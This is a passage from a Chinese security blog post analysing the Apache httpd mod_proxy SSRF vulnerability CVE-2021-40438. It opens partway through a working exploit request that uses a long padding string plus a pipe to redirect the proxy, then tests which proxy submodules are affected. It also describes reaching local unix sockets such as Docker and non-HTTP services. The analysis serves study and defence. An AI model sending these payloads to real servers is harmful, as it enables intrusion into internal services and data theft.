AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://example.com/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.162:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure>
<p>![image-20230916160123781](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160123781.png)</p>
<p>![image-20230916161434812](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916161434812.png)</p>
<p>上面这个是vps新建的1.txt</p>
<p>Apache官方对这个漏洞的修复也比较简单，因为用户只能控制<code>r-&gt;filename</code>的后半部分，而前半部分<code>proxy:&#123;scheme&#125;://&#123;host&#125;&#123;sport&#125;/</code>来自于配置文件，所以最新版改成检查其开头是不是<code>proxy:unix:</code>，这一部分用户无法控制。</p>
<h2 id="0x05-mod-proxy-fcgi是否存在漏洞？"><a href="#0x05-mod-proxy-fcgi是否存在漏洞？" class="headerlink" title="0x05-mod-proxy-fcgi是否存在漏洞？"></a>0x05 mod_proxy_fcgi是否存在漏洞？</h2>
<p>我们前文都以mod_proxy_http作为例子来研究，而在Apache+PHP环境下，mod_proxy_fcgi的使用频率更高，那么它是否也会被SSRF漏洞影响呢？</p>
<p>这个漏洞出现在modules/proxy/proxy_util.c的fix_uds_filename函数，理论上是mod_proxy的漏洞，那么它的子模块应该都会被影响，但这个漏洞中有一个很关键的变量是<code>r-&gt;filename</code>，他是否可控决定了后面的利用是否可以成功。</p>
<p>我们看一下mod_proxy_fcgi的canon函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">proxy_fcgi_canon</span><span class="hljs-params">(request_rec *r, <span class="hljs-type">char</span> *url)</span><br>&#123;<br>    <span class="hljs-type">char</span> *host, sport[<span class="hljs-number">7</span>];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *err;<br>    <span class="hljs-type">char</span> *path;<br>    <span class="hljs-type">apr_port_t</span> port, def_port;<br>    <span class="hljs-type">fcgi_req_config_t</span> *rconf = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathinfo_type = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">if</span> (ap_cstr_casecmpn(url, <span class="hljs-string">&quot;fcgi:&quot;</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) &#123;<br>        url += <span class="hljs-number">5</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> DECLINED;<br>    &#125;<br><br>    <span class="hljs-comment">// ...</span><br><br>    <span class="hljs-keyword">if</span> (apr_table_get(r-&gt;notes, <span class="hljs-string">&quot;proxy-nocanon&quot;</span>)) &#123;<br>        path = url;   <span class="hljs-comment">/* this is the raw path */</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        path = ap_proxy_canonenc(r-&gt;pool, url, <span class="hljs-built_in">strlen</span>(url), enc_path, <span class="hljs-number">0</span>,<br>                             r-&gt;proxyreq);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (path == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> HTTP_BAD_REQUEST;<br><br>    r-&gt;filename = apr_pstrcat(r-&gt;pool, <span class="hljs-string">&quot;proxy:fcgi://&quot;</span>, host, sport, <span class="hljs-string">&quot;/&quot;</span>,<br>                              path, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>可见，这里的<code>r-&gt;filename</code>等于<code>proxy:fcgi://&#123;host&#125;&#123;sport&#125;/&#123;path&#125;</code>，相比于mod_proxy_http少了search。不过，path仍然是用户可以控制的，我们可以尝试发送这样的数据包：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/unix:testtest|http://example.com/1.php</span> <span class="hljs-meta">HTTP/1.1</span><br>...<br></code></pre></td></tr></table></figure>
<p>经过调试可见，path中的<code>|</code>被<code>ap_proxy_canonenc</code>函数编码成了%7C：</p>
<p>![image-20230916160430616](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160430616.png)</p>
<p>没有<code>|</code>，后面也就无法完成SSRF利用了。</p>
<h2 id="0x06-哪些模块受到影响"><a href="#0x06-哪些模块受到影响" class="headerlink" title="0x06-哪些模块受到影响"></a>0x06 哪些模块受到影响</h2>
<p>那么，我们其实可以认为，如果<code>r-&gt;filename</code>有部分可控，且可控的部分没有被编码（不是path），这个模块就会受到SSRF漏洞的影响。</p>
<p>对这个结论我没有逐一测试考证，我仅挑选另一个较为常用的模块mod_proxy_ajp来复现漏洞。</p>
<p>mod_proxy_ajp是用于反代Tomcat的一个Apache模块，Tomcat在8.5.51版本以前默认会开启两个端口8080和8009，分别对应HTTP协议和AJP协议。HTTP协议好理解，AJP协议是一个二进制协议，通信协议相比起来效率更高。所以以前很多运维人员会将Tomcat架设在Apache之后，然后二者之间使用AJP协议通信。</p>
<p>Tomcat 8.5.51之后的版本受到<a target="_blank" rel="noopener" href="https://www.chaitin.cn/en/ghostcat">Ghostcat漏洞</a>影响不再默认开放8009端口。</p>
<p>Apache下有两个模块能实现AJP的反代通信：</p>
<ul>
<li>mod_proxy_ajp 这就是mod_proxy的一个子模块，由Apache HTTPd官方维护</li>
<li>mod_jk 这是Tomcat官方维护的一个Apache模块，更加出名用户也更多</li>
</ul>
<p>由于mod_jk不是用mod_proxy的代码，所以不受到影响，我们今天仅测试mod_proxy_ajp。</p>
<p>简单部署一个开放8009端口的Tomcat服务器，并配置好mod_proxy_ajp进行调试，可见其<code>proxy_ajp_canon</code>函数<code>r-&gt;filename</code>中是包含search的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">proxy_ajp_canon</span><span class="hljs-params">(request_rec *r, <span class="hljs-type">char</span> *url)</span><br>&#123;<br>    <span class="hljs-type">char</span> *host, *path, sport[<span class="hljs-number">7</span>];<br>    <span class="hljs-type">char</span> *search = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *err;<br>    <span class="hljs-type">apr_port_t</span> port, def_port;<br><br>    <span class="hljs-comment">/* ap_port_of_scheme() */</span><br>    <span class="hljs-keyword">if</span> (strncasecmp(url, <span class="hljs-string">&quot;ajp:&quot;</span>, <span class="hljs-number">4</span>) == <span class="hljs-number">0</span>) &#123;<br>        url += <span class="hljs-number">4</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> DECLINED;<br>    &#125;<br><br>    <span class="hljs-comment">// ...</span><br>    r-&gt;filename = apr_pstrcat(r-&gt;pool, <span class="hljs-string">&quot;proxy:ajp://&quot;</span>, host, sport,<br>                              <span class="hljs-string">&quot;/&quot;</span>, path, (search) ? <span class="hljs-string">&quot;?&quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>                              (search) ? search : <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>那么按照我们的预测，这里也会存在SSRF漏洞。果然测试成功：</p>
<p>![image-20230916160702168](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160702168.png)</p>
<p>那么，mod_proxy_http2、mod_proxy_balancer、mod_proxy_wstunnel等这些模块也会受到影响，而mod_proxy_uwsgi、mod_proxy_scgi等模块不受影响。我没有严格验证，有兴趣的同学可以自己下去调试一下，也许还能找到绕过方法。</p>
<h2 id="0x07-几个常见问题和总结"><a href="#0x07-几个常见问题和总结" class="headerlink" title="0x07-几个常见问题和总结"></a>0x07 几个常见问题和总结</h2>
<p>​		一个大家问的比较多的问题：这个SSRF漏洞是否能够POST？答案是肯定的，理解了原理的同学肯定能明白，我们实际上是控制了反向代理的目标服务器地址。既然是反向代理，那么实际上用户请求的大部分原始数据都会被直接转发给后端，所以，我们只需要发送POST请求，即可让执行POST的SSRF，比如：</p>
<p>![image-20230916160751658](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160751658.png)</p>
<p>另一个，这个SSRF漏洞是否可以打本地的unix socket？答案是肯定的。原本这个漏洞的第一请求目标就是本地的unix套接字，我们使用4092个超长search绕过了这个限制让他可以打任意远程地址，只要让它回归原本的方法就可以打本地的unix套接字了：</p>
<p>![image-20230916160834660](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160834660.png)</p>
<p>打本地unix套接字的好处是可以攻击类似于Docker、Supervisor这样的本地服务。</p>
<p>最后一个问题，这个SSRF漏洞是否可以攻击一些非HTTP协议的服务？答案也是肯定的。TCP是一个数据流，即使我们打出的数据包前面有HTTP头，这并不影响后续正常的满足二进制协议的数据流的发送与接收。不过有一个例外情况，如果目标服务有一些特殊的操作，类似于高版本redis读取到一些特殊的HTTP数据段就断开TCP连接这样的操作，那么可能需要进行一些额外绕过了。</p>
<p>总结一下，这个SSRF漏洞的本质是Apache在解析反代服务URL的时候，由于对<code>unix:</code>位置要求不严格，导致用户的输入可以控制反代的逻辑，最终导致反代URL被控制，造成SSRF漏洞。</p>
<p>CVE-2021-40438 漏洞为 Apache httpd 的 SSRF 漏洞，核心原理是 <code>mod_proxy</code> 模块为了支持 <code>UDS (Unix Domain Socket)</code> 转发而产生了安全性问题，并由多个位置代码问题组合产生。通过上面的分析可知，漏洞触发的前提如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.需开启 mod_proxy 配置<br>2.需已知 `VirtualHost` 中 `ProxyPass` 指定的 URL 项<br>3.使用 GET 请求超长字符串且超过目标 Apache 设置<br>4.windows 版本漏洞依然存在<br></code></pre></td></tr></table></figure>
<p>这里不知为何不能访问百度（新手别喷┭┮﹏┭┮）或许是百度做了防护或者是百度协议为https的缘故，亦或者某种原因吧，可能是我浅薄了。。。</p>
<h2 id="0x08-参考文章"><a href="#0x08-参考文章" class="headerlink" title="0x08-参考文章"></a>0x08 参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/263175">CVE-2021-40438 Apache mod_proxy SSRF 漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html">Apache mod_proxy SSRF（CVE-2021-40438）的一点分析和延伸</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/09/16/Apache%20HTTP%20Server%202.4.49%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/">← Next Apache HTTP Server 2.4.49 路径穿越漏洞 CVE-2021-41773</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/16/Apache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/">Apache HTTPD 换行解析漏洞（CVE-2017-15715） Prev →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">0x02 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Module%E7%BB%BC%E8%BF%B0"><span class="toc-number">2.1.</span> <span class="toc-text">Apache Module综述</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞原理分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">0x04 限制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">4.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-mod-proxy-fcgi%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">5.</span> <span class="toc-text">0x05 mod_proxy_fcgi是否存在漏洞？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%93%AA%E4%BA%9B%E6%A8%A1%E5%9D%97%E5%8F%97%E5%88%B0%E5%BD%B1%E5%93%8D"><span class="toc-number">6.</span> <span class="toc-text">0x06 哪些模块受到影响</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E5%87%A0%E4%B8%AA%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E5%92%8C%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">0x07 几个常见问题和总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">8.</span> <span class="toc-text">0x08 参考文章</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>